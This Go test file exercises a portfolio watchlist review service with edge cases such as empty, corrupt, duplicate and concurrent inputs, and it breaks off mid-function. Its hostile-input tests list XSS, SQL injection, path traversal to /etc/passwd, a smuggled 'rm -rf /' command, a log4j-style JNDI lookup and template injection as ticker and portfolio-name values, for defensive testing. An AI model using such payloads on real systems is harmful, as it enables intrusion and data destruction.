package portfolio

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/bobmcallan/vire/internal/common"
	"github.com/bobmcallan/vire/internal/interfaces"
	"github.com/bobmcallan/vire/internal/models"
	strategypkg "github.com/bobmcallan/vire/internal/services/strategy"
)

// --- Hostile input stress tests for ReviewWatchlist ---

func TestReviewWatchlist_EmptyWatchlist(t *testing.T) {
	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: []models.WatchlistItem{}}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore:   &reviewMarketDataStorage{data: map[string]*models.MarketData{}},
		signalStore:   &reviewSignalStorage{signals: map[string]*models.TickerSignals{}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	_, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err == nil {
		t.Fatal("expected error for empty watchlist, got nil")
	}
	if !strings.Contains(err.Error(), "empty") {
		t.Errorf("expected 'empty' in error message, got: %v", err)
	}
}

func TestReviewWatchlist_NonexistentWatchlist(t *testing.T) {
	storage := &reviewStorageManager{
		userDataStore: newMemUserDataStore(),
		marketStore:   &reviewMarketDataStorage{data: map[string]*models.MarketData{}},
		signalStore:   &reviewSignalStorage{signals: map[string]*models.TickerSignals{}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	_, err := svc.ReviewWatchlist(context.Background(), "nonexistent", interfaces.ReviewOptions{})
	if err == nil {
		t.Fatal("expected error for nonexistent watchlist")
	}
}

func TestReviewWatchlist_HostileTickers(t *testing.T) {
	hostileTickers := []string{
		"",                          // empty
		"   ",                       // whitespace only
		"<script>alert(1)</script>", // XSS attempt
		"'; DROP TABLE stocks;--",   // SQL injection
		"../../../etc/passwd",       // path traversal
		strings.Repeat("A", 10000),  // extremely long
		"\x00\x01\x02",              // null/control bytes
		"TICK\nER",                  // newline injection
		"TICK\rER",                  // carriage return
		"TICKER%00EVIL",             // null byte in middle
		"BHP.AU; rm -rf /",          // command injection
		"${jndi:ldap://evil}",       // log4j style
		"{{.Exec}}",                 // template injection
	}

	items := make([]models.WatchlistItem, len(hostileTickers))
	for i, ticker := range hostileTickers {
		items[i] = models.WatchlistItem{
			Ticker:  ticker,
			Verdict: models.WatchlistVerdictWatch,
		}
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore:   &reviewMarketDataStorage{data: map[string]*models.MarketData{}},
		signalStore:   &reviewSignalStorage{signals: map[string]*models.TickerSignals{}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	review, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err != nil {
		t.Fatalf("hostile tickers should not cause error (graceful degradation), got: %v", err)
	}

	// All items should be present with "Market data unavailable"
	if len(review.ItemReviews) != len(hostileTickers) {
		t.Errorf("expected %d reviews, got %d", len(hostileTickers), len(review.ItemReviews))
	}
	for i, ir := range review.ItemReviews {
		if ir.ActionRequired != "WATCH" {
			t.Errorf("item %d (%q): expected WATCH action, got %q", i, hostileTickers[i], ir.ActionRequired)
		}
	}
}

func TestReviewWatchlist_LargeWatchlist(t *testing.T) {
	// 100 items — should not panic or timeout
	items := make([]models.WatchlistItem, 100)
	for i := range items {
		items[i] = models.WatchlistItem{
			Ticker:  fmt.Sprintf("TICK%d.AU", i),
			Verdict: models.WatchlistVerdictPass,
		}
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore:   &reviewMarketDataStorage{data: map[string]*models.MarketData{}},
		signalStore:   &reviewSignalStorage{signals: map[string]*models.TickerSignals{}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	review, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err != nil {
		t.Fatalf("large watchlist should not fail: %v", err)
	}
	if len(review.ItemReviews) != 100 {
		t.Errorf("expected 100 reviews, got %d", len(review.ItemReviews))
	}
}

func TestReviewWatchlist_DuplicateTickers(t *testing.T) {
	items := []models.WatchlistItem{
		{Ticker: "BHP.AU", Verdict: models.WatchlistVerdictPass},
		{Ticker: "BHP.AU", Verdict: models.WatchlistVerdictFail},
		{Ticker: "bhp.au", Verdict: models.WatchlistVerdictWatch}, // case variant
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore: &reviewMarketDataStorage{data: map[string]*models.MarketData{
			"BHP.AU": {
				Ticker: "BHP.AU",
				EOD:    []models.EODBar{{Date: time.Now(), Close: 50}},
			},
		}},
		signalStore: &reviewSignalStorage{signals: map[string]*models.TickerSignals{
			"BHP.AU": {Ticker: "BHP.AU", Technical: models.TechnicalSignals{RSI: 50}},
		}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	review, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err != nil {
		t.Fatalf("duplicate tickers should not cause error: %v", err)
	}

	// All 3 items should be reviewed (duplicates are allowed)
	if len(review.ItemReviews) != 3 {
		t.Errorf("expected 3 reviews for duplicate tickers, got %d", len(review.ItemReviews))
	}
}

func TestReviewWatchlist_SingleEODBar(t *testing.T) {
	// With only 1 EOD bar, len(EOD) > 1 is false, overnight should be 0
	items := []models.WatchlistItem{
		{Ticker: "XYZ.AU", Verdict: models.WatchlistVerdictWatch},
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore: &reviewMarketDataStorage{data: map[string]*models.MarketData{
			"XYZ.AU": {
				Ticker: "XYZ.AU",
				EOD:    []models.EODBar{{Date: time.Now(), Close: 10.0}}, // only 1 bar
			},
		}},
		signalStore: &reviewSignalStorage{signals: map[string]*models.TickerSignals{
			"XYZ.AU": {Ticker: "XYZ.AU", Technical: models.TechnicalSignals{RSI: 55}},
		}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	review, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err != nil {
		t.Fatalf("single EOD bar should not cause error: %v", err)
	}
	if review.ItemReviews[0].OvernightMove != 0 {
		t.Errorf("overnight move should be 0 with single EOD bar, got %.4f", review.ItemReviews[0].OvernightMove)
	}
	if review.ItemReviews[0].OvernightPct != 0 {
		t.Errorf("overnight pct should be 0 with single EOD bar, got %.4f", review.ItemReviews[0].OvernightPct)
	}
}

func TestReviewWatchlist_ZeroPrevClose(t *testing.T) {
	// prevClose == 0 should not cause division by zero
	items := []models.WatchlistItem{
		{Ticker: "ZERO.AU", Verdict: models.WatchlistVerdictWatch},
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore: &reviewMarketDataStorage{data: map[string]*models.MarketData{
			"ZERO.AU": {
				Ticker: "ZERO.AU",
				EOD: []models.EODBar{
					{Date: time.Now(), Close: 5.0},
					{Date: time.Now().AddDate(0, 0, -1), Close: 0}, // zero prev close
				},
			},
		}},
		signalStore: &reviewSignalStorage{signals: map[string]*models.TickerSignals{
			"ZERO.AU": {Ticker: "ZERO.AU", Technical: models.TechnicalSignals{RSI: 50}},
		}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	review, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err != nil {
		t.Fatalf("zero prev close should not cause error: %v", err)
	}
	// Overnight move is computed, but pct should be 0 (guarded by prevClose > 0)
	if review.ItemReviews[0].OvernightMove != 5.0 {
		t.Errorf("overnight move should be 5.0, got %.4f", review.ItemReviews[0].OvernightMove)
	}
	if review.ItemReviews[0].OvernightPct != 0 {
		t.Errorf("overnight pct should be 0 for zero prev close, got %.4f", review.ItemReviews[0].OvernightPct)
	}
}

func TestReviewWatchlist_EmptyEODBars(t *testing.T) {
	// Market data exists but EOD slice is empty
	items := []models.WatchlistItem{
		{Ticker: "EMPTY.AU", Verdict: models.WatchlistVerdictWatch},
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore: &reviewMarketDataStorage{data: map[string]*models.MarketData{
			"EMPTY.AU": {
				Ticker: "EMPTY.AU",
				EOD:    []models.EODBar{}, // empty
			},
		}},
		signalStore: &reviewSignalStorage{signals: map[string]*models.TickerSignals{
			"EMPTY.AU": {Ticker: "EMPTY.AU", Technical: models.TechnicalSignals{RSI: 45}},
		}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	review, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err != nil {
		t.Fatalf("empty EOD bars should not cause error: %v", err)
	}
	if review.ItemReviews[0].OvernightMove != 0 {
		t.Errorf("overnight move should be 0 with empty EOD, got %.4f", review.ItemReviews[0].OvernightMove)
	}
}

func TestReviewWatchlist_NilSignals(t *testing.T) {
	// When signals are nil (no cached, compute returns nil), determineAction should handle it
	items := []models.WatchlistItem{
		{Ticker: "BHP.AU", Verdict: models.WatchlistVerdictPass},
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	// Signals storage returns error, and signalComputer.Compute will be called
	// with minimal market data — should still work
	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore: &reviewMarketDataStorage{data: map[string]*models.MarketData{
			"BHP.AU": {Ticker: "BHP.AU", EOD: []models.EODBar{{Date: time.Now(), Close: 10}}},
		}},
		signalStore: &reviewSignalStorage{signals: map[string]*models.TickerSignals{}}, // empty — triggers compute
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	review, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err != nil {
		t.Fatalf("nil signals should be handled gracefully: %v", err)
	}
	if len(review.ItemReviews) != 1 {
		t.Fatalf("expected 1 review, got %d", len(review.ItemReviews))
	}
}

func TestReviewWatchlist_ConcurrentRequests(t *testing.T) {
	// Verify no race conditions when reviewing the same watchlist concurrently
	items := []models.WatchlistItem{
		{Ticker: "BHP.AU", Verdict: models.WatchlistVerdictPass},
		{Ticker: "CBA.AU", Verdict: models.WatchlistVerdictWatch},
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore: &reviewMarketDataStorage{data: map[string]*models.MarketData{
			"BHP.AU": {Ticker: "BHP.AU", EOD: []models.EODBar{
				{Date: time.Now(), Close: 50}, {Date: time.Now().AddDate(0, 0, -1), Close: 48},
			}},
			"CBA.AU": {Ticker: "CBA.AU", EOD: []models.EODBar{
				{Date: time.Now(), Close: 100}, {Date: time.Now().AddDate(0, 0, -1), Close: 99},
			}},
		}},
		signalStore: &reviewSignalStorage{signals: map[string]*models.TickerSignals{
			"BHP.AU": {Ticker: "BHP.AU", Technical: models.TechnicalSignals{RSI: 50}},
			"CBA.AU": {Ticker: "CBA.AU", Technical: models.TechnicalSignals{RSI: 60}},
		}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))

	var wg sync.WaitGroup
	errs := make([]error, 10)
	for i := 0; i < 10; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			_, errs[idx] = svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
		}(i)
	}
	wg.Wait()

	for i, err := range errs {
		if err != nil {
			t.Errorf("concurrent request %d failed: %v", i, err)
		}
	}
}

func TestReviewWatchlist_WithLiveQuotes(t *testing.T) {
	items := []models.WatchlistItem{
		{Ticker: "BHP.AU", Verdict: models.WatchlistVerdictPass},
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	today := time.Now()
	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore: &reviewMarketDataStorage{data: map[string]*models.MarketData{
			"BHP.AU": {Ticker: "BHP.AU", EOD: []models.EODBar{
				{Date: today, Close: 50.0},
				{Date: today.AddDate(0, 0, -1), Close: 48.0},
			}},
		}},
		signalStore: &reviewSignalStorage{signals: map[string]*models.TickerSignals{
			"BHP.AU": {Ticker: "BHP.AU", Technical: models.TechnicalSignals{RSI: 55}},
		}},
	}

	eodhd := &stubEODHDClient{
		realTimeQuoteFn: func(_ context.Context, ticker string) (*models.RealTimeQuote, error) {
			if ticker == "BHP.AU" {
				return &models.RealTimeQuote{Code: "BHP.AU", Close: 52.0}, nil
			}
			return nil, fmt.Errorf("not found")
		},
	}

	svc := NewService(storage, nil, eodhd, nil, common.NewLogger("error"))
	review, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err != nil {
		t.Fatalf("live quote review failed: %v", err)
	}

	ir := review.ItemReviews[0]
	// Live quote 52.0, prev close 48.0 => move = 4.0, pct = (4.0/48.0)*100 ≈ 8.33
	if !approxEqual(ir.OvernightMove, 4.0, 0.01) {
		t.Errorf("overnight move = %.4f, want 4.0", ir.OvernightMove)
	}
	if !approxEqual(ir.OvernightPct, 8.33, 0.1) {
		t.Errorf("overnight pct = %.4f, want ~8.33", ir.OvernightPct)
	}
}

func TestReviewWatchlist_LiveQuoteZeroClose(t *testing.T) {
	// Live quote with Close=0 should be ignored
	items := []models.WatchlistItem{
		{Ticker: "BHP.AU", Verdict: models.WatchlistVerdictPass},
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	today := time.Now()
	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore: &reviewMarketDataStorage{data: map[string]*models.MarketData{
			"BHP.AU": {Ticker: "BHP.AU", EOD: []models.EODBar{
				{Date: today, Close: 50.0},
				{Date: today.AddDate(0, 0, -1), Close: 48.0},
			}},
		}},
		signalStore: &reviewSignalStorage{signals: map[string]*models.TickerSignals{
			"BHP.AU": {Ticker: "BHP.AU", Technical: models.TechnicalSignals{RSI: 50}},
		}},
	}

	eodhd := &stubEODHDClient{
		realTimeQuoteFn: func(_ context.Context, ticker string) (*models.RealTimeQuote, error) {
			// Return quote with zero close — should be filtered out
			return &models.RealTimeQuote{Code: ticker, Close: 0}, nil
		},
	}

	svc := NewService(storage, nil, eodhd, nil, common.NewLogger("error"))
	review, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err != nil {
		t.Fatalf("zero close quote should not cause error: %v", err)
	}

	ir := review.ItemReviews[0]
	// Should fall back to EOD bar calculation: 50.0 - 48.0 = 2.0
	if !approxEqual(ir.OvernightMove, 2.0, 0.01) {
		t.Errorf("overnight move = %.4f, want 2.0 (fallback to EOD)", ir.OvernightMove)
	}
}

func TestReviewWatchlist_LiveQuoteError(t *testing.T) {
	// EODHD returns error for all quotes — should gracefully fall back
	items := []models.WatchlistItem{
		{Ticker: "BHP.AU", Verdict: models.WatchlistVerdictPass},
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	today := time.Now()
	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore: &reviewMarketDataStorage{data: map[string]*models.MarketData{
			"BHP.AU": {Ticker: "BHP.AU", EOD: []models.EODBar{
				{Date: today, Close: 50.0},
				{Date: today.AddDate(0, 0, -1), Close: 48.0},
			}},
		}},
		signalStore: &reviewSignalStorage{signals: map[string]*models.TickerSignals{
			"BHP.AU": {Ticker: "BHP.AU", Technical: models.TechnicalSignals{RSI: 50}},
		}},
	}

	eodhd := &stubEODHDClient{
		realTimeQuoteFn: func(_ context.Context, _ string) (*models.RealTimeQuote, error) {
			return nil, fmt.Errorf("API rate limited")
		},
	}

	svc := NewService(storage, nil, eodhd, nil, common.NewLogger("error"))
	review, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err != nil {
		t.Fatalf("quote error should not cause review failure: %v", err)
	}
	ir := review.ItemReviews[0]
	// Should fall back to EOD bar calculation
	if !approxEqual(ir.OvernightMove, 2.0, 0.01) {
		t.Errorf("overnight move = %.4f, want 2.0 (fallback to EOD)", ir.OvernightMove)
	}
}

// --- determineAction with nil holding ---

func TestDetermineAction_NilHolding(t *testing.T) {
	// Watchlist passes nil holding to determineAction — verify no panic
	tests := []struct {
		name     string
		signals  *models.TickerSignals
		strategy *models.PortfolioStrategy
	}{
		{
			name:    "nil signals nil strategy",
			signals: nil,
		},
		{
			name:     "nil signals with strategy",
			signals:  nil,
			strategy: &models.PortfolioStrategy{RiskAppetite: models.RiskAppetite{Level: "aggressive"}},
		},
		{
			name:    "overbought RSI nil holding",
			signals: &models.TickerSignals{Technical: models.TechnicalSignals{RSI: 85}},
		},
		{
			name:    "oversold RSI nil holding",
			signals: &models.TickerSignals{Technical: models.TechnicalSignals{RSI: 15}},
		},
		{
			name:    "strategy with position sizing and nil holding",
			signals: &models.TickerSignals{Technical: models.TechnicalSignals{RSI: 50}},
			strategy: &models.PortfolioStrategy{
				PositionSizing: models.PositionSizing{MaxPositionPct: 10},
			},
		},
		{
			name:    "strategy with rules and nil holding",
			signals: &models.TickerSignals{Technical: models.TechnicalSignals{RSI: 80}},
			strategy: &models.PortfolioStrategy{
				Rules: []models.Rule{
					{
						Name:    "high_rsi",
						Enabled: true,
						Conditions: []models.RuleCondition{
							{Field: "signals.rsi", Operator: models.RuleOpGT, Value: 70.0},
						},
						Action:   models.RuleActionSell,
						Priority: 5,
						Reason:   "RSI is {signals.rsi}",
					},
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Should not panic
			action, reason := determineAction(tt.signals, nil, tt.strategy, nil, nil)
			if action == "" {
				t.Error("action should not be empty")
			}
			_ = reason
		})
	}
}

// --- CheckCompliance with nil holding ---

func TestCheckCompliance_NilHolding(t *testing.T) {
	strategy := &models.PortfolioStrategy{
		CompanyFilter: models.CompanyFilter{
			MaxPE:            25,
			MinDividendYield: 0.02,
			ExcludedSectors:  []string{"Utilities"},
		},
		PositionSizing: models.PositionSizing{
			MaxPositionPct: 15,
			MaxSectorPct:   30,
		},
		InvestmentUniverse: []string{"AU", "US"},
		SectorPreferences: models.SectorPreferences{
			Excluded: []string{"Utilities"},
		},
		Rules: []models.Rule{
			{
				Name:    "sell_high_pe",
				Enabled: true,
				Conditions: []models.RuleCondition{
					{Field: "fundamentals.pe", Operator: models.RuleOpGT, Value: 50.0},
				},
				Action:   models.RuleActionSell,
				Priority: 1,
				Reason:   "PE too high: {fundamentals.pe}",
			},
			{
				Name:    "sell_on_holding_weight",
				Enabled: true,
				Conditions: []models.RuleCondition{
					{Field: "holding.weight", Operator: models.RuleOpGT, Value: 20.0},
				},
				Action:   models.RuleActionSell,
				Priority: 1,
				Reason:   "Weight exceeds limit",
			},
		},
	}

	tests := []struct {
		name         string
		fundamentals *models.Fundamentals
		signals      *models.TickerSignals
	}{
		{
			name:         "nil fundamentals nil signals",
			fundamentals: nil,
			signals:      nil,
		},
		{
			name:         "excluded sector fundamentals",
			fundamentals: &models.Fundamentals{Sector: "Utilities", PE: 15},
			signals:      &models.TickerSignals{Technical: models.TechnicalSignals{RSI: 50}},
		},
		{
			name:         "high PE trigger sell rule with nil holding",
			fundamentals: &models.Fundamentals{PE: 60, Sector: "Technology"},
			signals:      &models.TickerSignals{Technical: models.TechnicalSignals{RSI: 50}},
		},
		{
			name:         "holding.weight rule with nil holding",
			fundamentals: &models.Fundamentals{PE: 10},
			signals:      &models.TickerSignals{Technical: models.TechnicalSignals{RSI: 50}},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Should not panic with nil holding
			result := strategypkg.CheckCompliance(strategy, nil, tt.signals, tt.fundamentals, 0)
			if result == nil {
				t.Fatal("result should not be nil when strategy is provided")
			}
		})
	}
}

// --- generateAlerts with zero-value Holding ---

func TestGenerateAlerts_ZeroValueHolding(t *testing.T) {
	// Watchlist creates Holding{Ticker: item.Ticker} with all other fields zeroed
	minimalHolding := models.Holding{Ticker: "TEST.AU"}

	tests := []struct {
		name     string
		signals  *models.TickerSignals
		strategy *models.PortfolioStrategy
	}{
		{
			name:    "nil signals",
			signals: nil,
		},
		{
			name:    "overbought RSI",
			signals: &models.TickerSignals{Technical: models.TechnicalSignals{RSI: 85}},
		},
		{
			name: "with risk flags",
			signals: &models.TickerSignals{
				Technical: models.TechnicalSignals{RSI: 50},
				RiskFlags: []string{"high_volatility", "low_liquidity"},
			},
		},
		{
			name:    "volume spike",
			signals: &models.TickerSignals{Technical: models.TechnicalSignals{VolumeSignal: "spike", VolumeRatio: 3.5}},
		},
		{
			name:    "death cross",
			signals: &models.TickerSignals{Technical: models.TechnicalSignals{SMA20CrossSMA50: "death_cross"}},
		},
		{
			name:    "zero weight with strategy position sizing",
			signals: &models.TickerSignals{Technical: models.TechnicalSignals{RSI: 50}},
			strategy: &models.PortfolioStrategy{
				PositionSizing: models.PositionSizing{MaxPositionPct: 10},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Should not panic
			alerts := generateAlerts(minimalHolding, tt.signals, nil, tt.strategy)
			for _, alert := range alerts {
				if alert.Ticker != "TEST.AU" {
					t.Errorf("alert ticker should be TEST.AU, got %q", alert.Ticker)
				}
			}
		})
	}
}

func TestGenerateAlerts_ZeroWeightNeverTriggersPositionSizeAlert(t *testing.T) {
	// Zero-value Holding.PortfolioWeightPct (0.0) should never trigger "exceeds strategy max" alert
	minimalHolding := models.Holding{Ticker: "TEST.AU", PortfolioWeightPct: 0}
	signals := &models.TickerSignals{Technical: models.TechnicalSignals{RSI: 50}}
	strategy := &models.PortfolioStrategy{
		PositionSizing: models.PositionSizing{MaxPositionPct: 10},
	}

	alerts := generateAlerts(minimalHolding, signals, nil, strategy)
	for _, alert := range alerts {
		if alert.Signal == "strategy_position_size" {
			t.Error("zero weight holding should not trigger position size alert")
		}
	}
}

// --- Strategy rules with nil holding fields ---

func TestEvaluateRules_HoldingFieldsWithNilHolding(t *testing.T) {
	// Rules referencing holding.* fields should gracefully return false
	// when the holding is nil (watchlist scenario)
	rules := []models.Rule{
		{
			Name:    "weight_check",
			Enabled: true,
			Conditions: []models.RuleCondition{
				{Field: "holding.weight", Operator: models.RuleOpGT, Value: 20.0},
			},
			Action: models.RuleActionSell,
		},
		{
			Name:    "units_check",
			Enabled: true,
			Conditions: []models.RuleCondition{
				{Field: "holding.units", Operator: models.RuleOpGT, Value: 1000.0},
			},
			Action: models.RuleActionSell,
		},
		{
			Name:    "market_value_check",
			Enabled: true,
			Conditions: []models.RuleCondition{
				{Field: "holding.market_value", Operator: models.RuleOpGT, Value: 50000.0},
			},
			Action: models.RuleActionSell,
		},
	}

	ctx := strategypkg.RuleContext{
		Holding:      nil,
		Signals:      &models.TickerSignals{Technical: models.TechnicalSignals{RSI: 50}},
		Fundamentals: &models.Fundamentals{PE: 15},
	}

	results := strategypkg.EvaluateRules(rules, ctx)
	if len(results) != 0 {
		t.Errorf("holding.* rules should not match with nil holding, got %d matches", len(results))
	}
}

// --- Corrupt watchlist data ---

func TestReviewWatchlist_CorruptWatchlistJSON(t *testing.T) {
	uds := newMemUserDataStore()
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: "not valid json {{{",
	})

	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore:   &reviewMarketDataStorage{data: map[string]*models.MarketData{}},
		signalStore:   &reviewSignalStorage{signals: map[string]*models.TickerSignals{}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	_, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err == nil {
		t.Fatal("corrupt JSON should return error")
	}
	if !strings.Contains(err.Error(), "unmarshal") {
		t.Errorf("error should mention unmarshal, got: %v", err)
	}
}

func TestReviewWatchlist_WatchlistWithNilItems(t *testing.T) {
	// JSON with items: null
	uds := newMemUserDataStore()
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test",
		Value: `{"portfolio_name":"test","items":null}`,
	})

	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore:   &reviewMarketDataStorage{data: map[string]*models.MarketData{}},
		signalStore:   &reviewSignalStorage{signals: map[string]*models.TickerSignals{}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	_, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err == nil {
		t.Fatal("null items should return error (treated as empty)")
	}
}

// --- Strategy interaction edge cases ---

func TestReviewWatchlist_StrategyWithAllFilters(t *testing.T) {
	// Full strategy with every filter type — verify no panic with watchlist items
	items := []models.WatchlistItem{
		{Ticker: "BHP.AU", Verdict: models.WatchlistVerdictPass},
	}

	uds := newMemUserDataStore()
	watchlist := models.PortfolioWatchlist{PortfolioName: "test", Items: items}
	data, _ := json.Marshal(watchlist)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "watchlist", Key: "test", Value: string(data),
	})

	// Also store a strategy
	strategy := models.PortfolioStrategy{
		PortfolioName:      "test",
		AccountType:        "trading",
		InvestmentUniverse: []string{"AU"},
		RiskAppetite:       models.RiskAppetite{Level: "conservative"},
		CompanyFilter: models.CompanyFilter{
			MinMarketCap:     1e9,
			MaxPE:            30,
			MinDividendYield: 0.02,
			AllowedSectors:   []string{"Materials", "Financials"},
			ExcludedSectors:  []string{"Utilities"},
		},
		PositionSizing: models.PositionSizing{
			MaxPositionPct: 15,
			MaxSectorPct:   40,
		},
		SectorPreferences: models.SectorPreferences{
			Preferred: []string{"Materials"},
			Excluded:  []string{"Utilities"},
		},
		Rules: []models.Rule{
			{
				Name:    "rsi_sell",
				Enabled: true,
				Conditions: []models.RuleCondition{
					{Field: "signals.rsi", Operator: models.RuleOpGT, Value: 65.0},
				},
				Action:   models.RuleActionSell,
				Priority: 5,
				Reason:   "RSI {signals.rsi} > 65",
			},
		},
	}
	stratData, _ := json.Marshal(strategy)
	uds.Put(context.Background(), &models.UserRecord{
		UserID: "default", Subject: "strategy", Key: "test", Value: string(stratData),
	})

	storage := &reviewStorageManager{
		userDataStore: uds,
		marketStore: &reviewMarketDataStorage{data: map[string]*models.MarketData{
			"BHP.AU": {
				Ticker:       "BHP.AU",
				EOD:          []models.EODBar{{Date: time.Now(), Close: 50}, {Date: time.Now().AddDate(0, 0, -1), Close: 48}},
				Fundamentals: &models.Fundamentals{PE: 12, MarketCap: 150e9, Sector: "Materials", DividendYield: 0.04},
			},
		}},
		signalStore: &reviewSignalStorage{signals: map[string]*models.TickerSignals{
			"BHP.AU": {Ticker: "BHP.AU", Technical: models.TechnicalSignals{RSI: 70}},
		}},
	}

	svc := NewService(storage, nil, nil, nil, common.NewLogger("error"))
	review, err := svc.ReviewWatchlist(context.Background(), "test", interfaces.ReviewOptions{})
	if err != nil {
		t.Fatalf("strategy with all filters should not fail: %v", err)
	}

	if len(review.ItemReviews) != 1 {
		t.Fatalf("expected 1 review, got %d", len(review.ItemReviews))
	}

	ir := review.ItemReviews[0]
	// Strategy rule should trigger (RSI 70 > 65)
	if ir.Compliance == nil {
		t.Fatal("compliance should be set when strategy exists")
	}
}

// --- Portfolio name edge cases ---

func TestReviewWatchlist_HostilePortfolioNames(t *testing.T) {
	hostileNames := []string{
		"",
		"   ",
		"../../../etc/passwd",
		"<script>alert(1)</script>",
		"'; DROP TABLE watchlist;--",
		strings.Repeat("X", 10000),
	}

	storage := &reviewStorageManager{
		userDataStore: newMemUserDataStore(),
